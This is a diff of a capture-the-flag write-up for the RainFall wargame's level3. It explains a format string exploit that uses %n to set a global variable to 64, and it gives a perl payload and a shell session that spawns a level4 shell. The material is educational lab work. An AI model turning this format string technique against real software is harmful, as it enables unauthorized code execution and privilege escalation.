@@ -1,18 +1,16 @@
+After fgets (protected from overflows) and printf calls if m == 64 there is a call to system("/bin/sh")
 m is a global variable stored at 0x0804988c
-esp content is 0xbffff4e0
-printf string is *(ebp-0x208) (0xbffff6f8)
 
-
-Format string :
-%n	let us write printed length to the variable pointed by arg
-$	allows us to choose the offset of in the memory
+Format string exploit:
+%n	write current printed length to the variable pointed by arg
+$	allows us to choose the offset printf args
 
 We can set m to 64 by writing 64 char before %n and move
 the offset to the address at the beginning of the string
 
-	perl -e 'print "\x8c\x98\x04\x08                                                            %4\$n\n"' > /tmp/str
+	perl -e 'print "\x8c\x98\x04\x08   [some spaces to get to 64 of length]   %4\$n\n"' > /tmp/str
 	level3@RainFall:~$ cat /tmp/str - | ./level3
-	[[]
+	[unprintable char]
 	Wait what?!
 	whoami
 	level4
